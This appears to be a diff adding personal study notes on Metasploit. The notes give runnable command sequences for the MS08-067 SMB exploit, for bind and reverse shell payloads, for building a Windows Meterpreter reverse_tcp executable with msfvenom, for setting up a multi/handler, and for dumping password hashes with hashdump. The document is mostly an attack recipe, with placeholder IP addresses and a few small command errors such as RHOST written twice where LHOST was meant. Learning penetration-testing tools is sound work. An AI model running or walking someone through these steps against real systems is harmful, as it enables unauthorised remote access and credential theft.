@@ -1,0 +1,103 @@
+-Metasploit is used to find a vulnerability on a OS by running a bunch of exploits until it works
+-can be used to get access to a target using its IP address
+
+note:
+-exploits won't work on systems that use update patches that fix the issue
+-RHOSTS is the ip address of target
+-LHOSTS is the ip address of you
+-"exploit" can be dropped off of path when referencing exploits
+
+====================== Operations and Commands for MSF Console ====================
+
+update module to ensure its up-to-date:
+msfupdate
+
+
+start up services:
+service postgresql start --->
+service metasploit start --->
+msfconsole   ---> runs the program
+
+
+metasploit commands:
+help [commandName]  --> get info on the command
+
+
+while msfconsole is running (msf commands):
+msf > use exploit/windows/smb/ms08_067_netapi		----> assign exploit that will be used to metasploit
+msf exploit(ms08_067_netapi) > show targets	 ----> show target OS's
+msf exploit(ms08_067_netapi) > show options	----> shows all options and payloads assigned, this shows updated info for metasploit after a set command is used
+msf exploit(ms08_067_netapi) > set RHOST [IPAddress]	----> assign target that will be attacked
+msf exploit(ms08_067_netapi) > show payload	----> show payloads to use
+msf exploit(ms08_067_netapi) > set payload windows/shell/bind_tcp	----> this payload makes a bind shell
+msf exploit(ms08_067_netapi) > exploit	----> run the exploit
+
+
+CTRL+C to close session
+CTRL+Z to run as background session
+msf exploit(ms08_067_netapi) > sessions -l	---> see all openn sessions if any is in background
+msf exploit(ms08_067_netapi) > sessions -i   [sessionNumber]	---> to interact with any sessions in the background
+
+
+
+Auxiliary Modules:
+-used to find available pipes for annonymous users before running the exploits (exploits will default it, but the exploit may not work unless we have the right pipe)
+-show named pipes listening on smb server
+-payloads arent needed as we are not exploiting anything
+msf exploit(ms08_067_netapi) > use auxiliary/scanner/smb/pipe_auditor
+msf exploit(ms08_067_netapi) > show options	----> shows all options for auxiliaries
+msf exploit(ms08_067_netapi) > set RHOSTS [IPAddress]	----> assign target that will be attacked
+msf exploit(ms08_067_netapi) > exploit
+
+====================== Operations and Commands for MSF Console ====================
+
+
+====================== Metasploits Command Line Interface (msfcli) ====================
+Alternate form of metasploit (command line version)
+Metasploits command line interface (msfcli)
+
+commands:
+msfcli [ExploitName] [Options=] [Mode]
+msfcli -h	---> show all modes for msfcli
+msfcli exploit/windows/smb/ms08_067_netapi P	---> show available payloads for the exploit "ms08_067_netapi"
+msfcli exploit/windows/smb/ms08_067_netapi payload=windows/shell/reverse_tcp O	---> the "O" command will show all options for payloads assigned 
+ifconfig	----> to find ip address of user device to fill LHOST information
+msfcli exploit/windows/smb/ms08_067_netapi payload=windows/shell/reverse_tcp RHOST=[TargetIPAddress] RHOST=[MyIPAddress] E	----> "E" is for executing payload on target
+
+
+====================== Metasploits command line interface (msfcli) ====================
+
+
+====================== Metasploit Venom (msfvenom) and Meterpreter ====================
+-encapsultes two MSF tools into 1 (example is msfpayload + msfencode)
+-quicker to use then using seperate msf tools
+
+
+commands: (creating a standalone executable)
+msfvenom -h	---> show all modes for msfvenom
+msfvenom  -p  windows/meterpreter/reverse_tcp -o	----> show options '-o' for '-p' payload  "windows/meterpreter/reverse_tcp"
+ipconfig						---> find your ip address
+msfvenom  --help-formats				---> show all available formats
+msfvenom  -p  windows/meterpreter/reverse_tcp   LHOST=[MyIPAdress]   LPORT=1234 -f exe > nameOfFile.exe	----> LPORT can be any available port, '-f' is for the format (in this case we are making an executable)
+
+
+setting up a handler to deal with its payload:
+msfconsole
+msf > info exploit/multi/handler
+msf > use multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp	----> assign what payload it should handle (the payload from the msfvenom executable)
+msf exploit(handler) > show options	---> show options for reverse_tcp
+msf exploit(handler) > ifconfig		---> get my ip address for LHOST
+msf exploit(handler) > set LHOST [MyIPAdress]
+msf exploit(handler) > set LPORT 1234
+msf exploit(handler) > exploit		----> start the payload handler
+
+
+meterpreter session if target runs executable:
+meterpreter > help
+meterpreter > getuid	---> get server username logged into OS
+meterpreter > hashdump
+
+
+
+====================== Metasploit Venom (msfvenom) and Meterpreter ====================
